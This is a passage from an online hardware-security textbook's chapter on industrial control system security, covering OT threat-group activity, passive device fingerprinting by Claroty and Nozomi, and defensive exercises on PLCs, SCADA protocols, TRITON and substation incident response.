+<p><strong>BENTONITE:</strong> Targeted oil and gas upstream equipment – Emerson DeltaV DCS, Honeywell Experion PKS – with initial access through VPN gateway compromise, followed by OPC-UA enumeration to identify controllable hardware assets.</p>
+</li>
+<li>
+<p><strong>Hardware asset discovery:</strong> Multiple threat groups were observed using Shodan, ZoomEye, and active scanning to identify internet-exposed OT hardware prior to targeted intrusions. Exposed assets include: Siemens S7-300/400 PLCs with S7comm accessible on TCP/102 (approximately 4,200 globally Internet-exposed as of Q4 2023).</p>
+</li>
+</ul>
+<h3 id="31186-ot-hardware-security-claroty-and-nozomi-hardware-fingerprinting"><span class="secnum">31.18.6</span> OT Hardware Security — Claroty and Nozomi Hardware Fingerprinting<a class="headerlink" href="#31186-ot-hardware-security-claroty-and-nozomi-hardware-fingerprinting" title="Permanent link">&para;</a></h3>
+<p>Passive OT asset visibility platforms evolved to include hardware-level fingerprinting:</p>
+<p><strong>Claroty xDome (2023–2024):</strong></p>
+<ul>
+<li>
+<p>Protocol-based fingerprinting: passive analysis of PROFINET DCP, BACnet Who-Is/I-Am, DNP3 Data Link Layer identify hardware vendor and model without active scanning. Model confidence score <span class="arithmatex">\(&gt;95\%\)</span> for 847 OT device types.</p>
+</li>
+<li>
+<p>Firmware version extraction: Claroty passively extracts firmware version strings from unencrypted protocol responses (Modbus FC43 Device Identification, EtherNet/IP Identity Object Attribute 3), enabling CVE correlation without credentialed access.</p>
+</li>
+</ul>
+<p><strong>Nozomi Networks Guardian (2024):</strong></p>
+<ul>
+<li>
+<p>ML-based hardware anomaly detection: trained on 200+ million OT device communication baseline samples. Detects hardware replacement attacks (physical swap of a PLC with a Trojanised unit) by identifying deviations in process variable timing patterns and protocol microsecond-timing signatures unique to specific hardware variants.</p>
+</li>
+<li>
+<p>Vantage platform: cloud-based aggregation of Guardian sensor telemetry enables cross-site hardware anomaly correlation – if a firmware upgrade anomaly is detected at one site, similar patterns at peer sites generate pre-emptive alerts.</p>
+</li>
+</ul>
+<h2 id="3119-exercises"><span class="secnum">31.19</span> Exercises<a class="headerlink" href="#3119-exercises" title="Permanent link">&para;</a></h2>
+<div class="admonition example box-exercises kind-example">
+<p class="admonition-title">Exercises</p>
+<ol>
+<li>
+<p>A Siemens S7-300 PLC (CPU 315-2 DP) controlling a water pump station has no security features beyond a physical key switch. The plant manager asks for an upgrade path to IEC 62443-3-3 SL-2 compliance without replacing the PLC hardware. Describe the compensating controls that can achieve SL-2 equivalent protection at the network and physical layer, and identify which SL-2 requirements cannot be met without hardware replacement.</p>
+</li>
+<li>
+<p>Modbus TCP is used on an OT network with no function code restrictions. An attacker on a compromised engineering workstation sends FC08 (Diagnostics, sub-function 01 – Restart Communications Option) to all 24 RTUs simultaneously. Describe the physical impact on the process, the detection capability of each OT monitoring platform (Dragos, Claroty, Nozomi), and the network-level control that would have blocked this command.</p>
+</li>
+<li>
+<p>The TRITON malware exploited the Triconex Tricon Model 3008 via the TriStation 1131 protocol. The Triconex implements Triple Modular Redundancy (TMR) with 2-of-3 voting. Explain why the TMR architecture failed to prevent the TRITON attack from disabling the SIS (hint: consider what happens when TRITON’s buggy code causes two of three CPUs to enter fail-safe state simultaneously), and propose a defense that uses the TMR architecture itself as a detection mechanism.</p>
+</li>
+<li>
+<p>A CRASHOVERRIDE-style attack targets a 230kV substation using unauthorized IEC 60870-5-104 commands sent from a compromised engineering workstation. The substation has 8 RTUs controlling transformer tap changers and 12 RTUs controlling feeder circuit breakers. Design an incident response playbook for the first 15 minutes after detection, specifying: isolation steps that preserve substation stability, forensic data collection from network TAPs, and the NERC CIP incident reporting timeline requirements.</p>
+</li>
+<li>
+<p>Allen-Bradley ControlLogix 5580 (1756-L85E) implements CIP Security for EtherNet/IP using DTLS 1.2 for Class 1 (implicit) messaging. A plant engineer claims that the DTLS handshake adds 50ms latency, making it unacceptable for a PLC I/O scan cycle of 10ms. Evaluate this claim: calculate the actual DTLS handshake overhead for a pre-established session versus a new session establishment, and propose the Session ID resumption configuration that eliminates per-packet handshake overhead.</p>
+</li>
+<li>
+<p>A data diode (Waterfall Security Unidirectional Security Gateway) is deployed between the OT historian (Levels 2/3) and the enterprise network (Level 4). The OT team needs to send firmware updates from Level 4 to Level 2 PLCs. Explain why a strict data diode architecture cannot support this requirement, and design a secure alternative that maintains the security properties of the OT network while enabling controlled firmware distribution.</p>
+</li>
+<li>
+<p>The Honeywell Safety Manager (HSM) post-TRITON security update requires firmware to be cryptographically signed before installation. Describe the complete key management architecture for a petrochemical plant with 5 HSM controllers: how the signing keys are generated and stored (HSM vendor, plant, or end user?), the signing ceremony process, the key distribution to controllers, and the revocation procedure if the signing key is compromised.</p>
+</li>
+<li>
+<p>IEC 62351-6 defines optional authentication for IEC 61850 GOOSE messages using AES-128-GMAC. A protection relay engineer argues that implementing GOOSE authentication will cause protection operations to exceed the allowable operating time of 100ms specified in IEC 61850-5 for Class P3 (Performance Level 3). Evaluate this claim by calculating the GMAC computation latency for a 200-byte GOOSE frame on an Arm Cortex-M7 running at 216 MHz (with hardware AES acceleration), and determine whether authentication is feasible within the timing constraint.</p>
+</li>
+<li>
+<p>A SCADA historian (OSIsoft PI Server) at Level 3 must push process data to an enterprise data lake (Level 4) in real time for machine learning model training. The security team requires a data diode; the OT team requires bi-directional PI replication. Research and evaluate two architectures that satisfy both requirements: (1) Waterfall Secure Bypass with time-limited supervised channel, and (2) OSIsoft PI Replication over data diode with event queuing. Compare their security properties and failure modes.</p>
+</li>
+<li>
+<p>MITRE ATT&amp;CK ICS technique T0857 (System Firmware) involves an attacker installing malicious firmware on an industrial PC running a SCADA HMI (Windows 10 LTSC 2019, Intel Core i5-8500). Describe: the attack vector (UEFI firmware vulnerability or bootkit), the persistence mechanism, the detection challenge compared to SCADA application-layer attacks, and the hardware-based defense using Intel Boot Guard + Intel TXT measured boot.</p>
+</li>
+<li>
+<p>A natural gas pipeline SCADA system uses DNP3 over satellite (VSAT) links to communicate with compressor station RTUs at 9600 baud. The RTU engineer reports that enabling DNP3 SAv5 (Secure Authentication version 5) increases the per-command overhead from 24 bytes to 156 bytes (due to HMAC and challenge messages). Calculate the impact on communication latency and throughput at 9600 baud, and propose an optimization that maintains SAv5 security while minimizing bandwidth overhead.</p>
+</li>
+<li>
+<p>After the 2021 Colonial Pipeline ransomware attack (which compromised IT systems, not OT systems directly), the company preemptively shut down OT systems for 6 days. Design a network architecture and detection system that would allow an operator to: (1) confirm that OT systems are not compromised even if IT systems are, (2) continue OT operations during an IT network compromise, and (3) safely resume IT/OT connectivity after IT remediation. Specify the hardware components (firewalls, data diodes, monitoring) and detection mechanisms for each goal.</p>
+</li>
+</ol>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="ch30-medical-device-hardware-security.html" class="md-footer__link md-footer__link--prev" aria-label="Previous: 30. Medical Device Hardware Security">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                30. Medical Device Hardware Security
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="ch32-biometric-hardware-security.html" class="md-footer__link md-footer__link--next" aria-label="Next: 32. Biometric Hardware Security">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              <div class="md-ellipsis">
+                32. Biometric Hardware Security
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Pustakālaya &middot;
+      <a href="../../about.html">About this edition</a> &middot;
+      © The authors of the books
+    </div>
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.instant", "navigation.tracking", "navigation.indexes", "navigation.prune", "navigation.top", "navigation.footer", "search.suggest", "search.highlight", "toc.follow", "content.code.copy"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+  
+      <script src="../../assets/javascripts/bundle.d7400e89.min.js"></script>
+      
+        <script src="../../assets/mathjax.js"></script>
+      
+        <script src="../../assets/reader.js"></script>
+      
+        <script src="../../assets/app.js"></script>
+      
+    
+  <script>
+    /* offline reading: the service worker at the site root (its scope is the whole site) */
+    if ("serviceWorker" in navigator && window.isSecureContext) {
+      window.addEventListener("load", function () {
+        navigator.serviceWorker.register(new URL("../../sw.js", location.href).href).catch(function () {});
+      });
+    }
+  </script>
+
+  </body>
+</html>
